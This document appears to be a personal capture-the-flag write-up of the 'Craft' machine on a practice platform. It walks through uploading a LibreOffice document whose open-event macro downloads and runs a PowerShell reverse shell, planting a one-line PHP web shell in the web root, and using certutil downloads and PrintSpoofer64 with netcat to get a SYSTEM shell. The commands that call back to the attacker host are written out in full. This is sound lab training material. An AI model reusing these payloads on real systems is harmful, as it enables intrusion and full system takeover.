---
Alias: Craft
Date: 9/14/2022
Platform: Windows
Difficulty: Intermediate
Tags: #macros #LibreOffice #WebRootDirectory #xampp #Htdocs #WindowsServer2019StandardSeImpersonatePrivilegeEscalation #PrintSpoofer64 
Status: Finished
IP: 192.168.229.169
---

# {{Craft}}


# Resolution summary
- Found webpage with upload file capabilities 
- Uploaded an .otd file with a macro to initiate a reverse shell
- Unable to locate a privilege escalation vector with user thecybergeek
- Found another non default user apache
- Found thecybergeek user can write to the web root directory C:/xampp/htdocs
- Downloaded a cmd.php file to web root directory
- Navigated to the php command shell in firefox which confirmed we have RCE as user apache
- Downloaded a reverse.ps1 reverse shell to the box with the php command shell
- Initiated the reverse shell with the php command shell
- Found apache user has SeImpersonate privileges enabled 
- Found the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC
- Downloaded PrintSpoofer64.exe on the target machine 
- Initiated the PrintSpoofer64.exe privilege escalation exploit and received a shell running as nt/authority system

## Improved skills
- LibreOffice
- macros
- PrintSpoofer.64.exe commands
- cmd /c shell command
- powershell iwr download command

## Used tools
- nmap
- LibreOffice

---

# Information Gathering
Scanned all TCP ports:
```bash
#Nmap 7.92 scan initiated Sun Aug 21 12:35:40 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/_full_tcp_nmap.txt -oX /home/brian/Downloads/Proving_Grounds/Craft/results/192.168.229.169/scans/xml/_full_tcp_nmap.xml 192.168.229.169
Nmap scan report for 192.168.229.169
Host is up, received user-set (0.20s latency).
Scanned at 2022-08-21 12:35:42 PDT for 328s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Craft

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
#Nmap done at Sun Aug 21 12:41:10 2022 -- 1 IP address (1 host up) scanned in 329.26 seconds
```

Enumerated open TCP ports:
```bash
80
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80 - HTTP (Apache)

#### - Navigated to "http://192.168.122.169" and found the following webpage:

![](Pasted%20image%2020230407224047.png)

#### - Found the following where we can upload our "resume":

![](Pasted%20image%2020230407224227.png)

#### - Tried to upload a random file and received the following:

![](Pasted%20image%2020230407224319.png)

#### - Googled ".odt file" and found the following page showing .odt files are typically created by OpenOffice and LibreOffice Writer programs:

![](Pasted%20image%2020230407224402.png)

![](Pasted%20image%2020230407224442.png)

#### - I then downloaded LibreOffice on my kali machine by typing "sudo apt-get install -y libreoffice-writer"

#### - Started LibreOffice and clicked "Writer Document":

![](Pasted%20image%2020230407224535.png)

#### - Clicked Tools > Macros > Organize Macros > Basic:

![](Pasted%20image%2020230407224628.png)

#### - Clicked "Untitled 1" > "New" and named the file Offsec1 and clicked "OK":

![](Pasted%20image%2020230407224715.png)

#### - Typed Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub" (which will perform an HTTP request to our IP). If we are hosting on port 80 and port is open the command should execute:

![](Pasted%20image%2020230407225512.png)

#### - Clicked File > Save 

![](Pasted%20image%2020230407230026.png)

#### - Named the file "Offesec1" and clicked Save:

![](Pasted%20image%2020230407230118.png)

#### - I then attached the macro/script to an event by clicking Tools > customize and in the "Events" tab > Open Document > Macro > double cick Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK:

![](Images/Pasted%20image%2020220823123215.png)

![](Images/Pasted%20image%2020220823123456.png)



![](Images/Pasted%20image%2020220823170108.png)


#### - Now the Event "Open Document" is assigned an action:

![](Images/Pasted%20image%2020220823170532.png)

#### - Clicked "File" then "Save"


#### - Typed "updog -p 80" (in the same directory where the newly created Offsec1.odt file is located in) on my kali machine to host the .odt file:

![](Images/Pasted%20image%2020220823175748.png)

#### - Navigated back to the webpage and clicked "browse" and chose my newly created ".odt" file and clicked upload and received the following page showing the file was accepted:

![](Images/Pasted%20image%2020220824174631.png)

![](Images/Pasted%20image%2020220821133156.png)

#### - Looking back on our kali machine hosting the .odt file we received code 200 and confirm we have execution on the target machine in the event someone opens the document we just uploaded to the target site

![](Images/Pasted%20image%2020220824213229.png)


---

# Exploitation
## Upload Of An .odt File With A Macro To Initiate A Reverse Shell

#### - Navigated back into the offsec1.odt file in LibreOffice Basic and clicked edit

#### -Removed the previous powershell code we had in there before and replaced it with the following to download the offsec.ps1 reverse and to execute it:

Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tasks/offsec.ps1")

Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")

![](Images/Pasted%20image%2020230322193151.png)


#### - Clicked File then save

#### - Typed vim offsec.ps1 on my kali machine

#### - Navigated to www.revshells.com

#### - Copied contents in between the quotation marks in the PowerShell #3 tab for Windows payload and pasted it into the offsec.ps1 file

![](Images/Pasted%20image%2020230406161956.png)

#### - Typed chmod 775 offsec.ps1 to make it executable

#### - Started a listener to listen on port 8080 as that was the port provided in the powershell one liner reverse shell (offsec.ps1)

#### - Re-uploaded the offsec1.odt file and receive a windows reverse shell

![](Images/Pasted%20image%2020230406162546.png)
---

# Lateral Movement to user
## Local Enumeration

#### - Typed whoami and found we were user thecybergeek

#### - Ran privesc scripts but found nothing

#### - Typed "net users" and found default users and user apache

#### - Navigated to directory "C:\" and found "xampp" directory

#### - Navigated into xampp and found direcory htdocs (which is the root directory of the craft website)

#### - Attempted to write to the directory to confirm write permissions and found we did have write permissions:

![](Images/Pasted%20image%2020230406182621.png)

#### - Googled "php one liner command shell"

#### - Pasted the found contents below into a "cmd.php" file on my kali machine:

<?php system($_GET['cmd']); ?>

#### - Transfered the cmd.php file to the htdocs directory on the shell

#### - Navigated to http://192.168.98.169/cmd.php?cmd=whoami in firefox and found we have command execution as apache

![](Images/Pasted%20image%2020230406182312.png)


## Lateral Movement vector
# PHP Webshell

#### - Started a netcat listener on port 8081

#### - Created a powershell reverse shell named reverse.ps1:

![](Images/Pasted%20image%2020230407203747.png)

#### - Started an http server in the directory with the reverse.ps1 to host the file

#### - Typed the following command in firefox to download the reverse.ps1 file to the target:

http://192.168.98.169/cmd.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http://192.168.49.98:82/reverse.ps1%20reverse.ps1

#### - Typed the following command to run the payload and received a reverse shell as user apache:

http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.ps1

![](Images/Pasted%20image%2020230407204340.png)
---

# Privilege Escalation
## Local Enumeration

#### - Typed whoami /all and found the apache user has SeImpersonatePrivilege enabled

![](Images/Pasted%20image%2020230407205251.png)

#### - Typed systeminfo to see the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC

![](Images/Pasted%20image%2020230407205700.png)
![](Images/Pasted%20image%2020230407210050.png)

#### - Googled "Windows Server 2019 Standard SeImpersonate privilege escalation" and found the following webpage to utilize PrintSpoofer64.exe to escalate privileges:

![](Images/Pasted%20image%2020230407210309.png)

![](Images/Pasted%20image%2020230407210430.png)


## Privilege Escalation vector
## Windows Server 2019 Standard SeImpersonate Privilege Escalation

#### - Started an http server on my kali machine to host PrintSpoofer64.exe

#### - Typed the following command to download it to the target machine:

certutil.exe -urlcache -split -f http://192.168.49.98:81/PrintSpoofer64.exe PrintSpoofer64.exe

![](Images/Pasted%20image%2020230407204907.png)

#### - Downloaded nc64.exe from kali machine to target machine as well

#### - Typed the following command on the target machine while having a netcat listner on port 1337 on my kali machine and received a cmd shell as nt/authority system:

./PrintSpoofer64.exe -c "nc64.exe 192.168.49.98 1337 -e cmd"

![](Images/Pasted%20image%2020230407212025.png)

![](Images/Pasted%20image%2020230407212132.png)
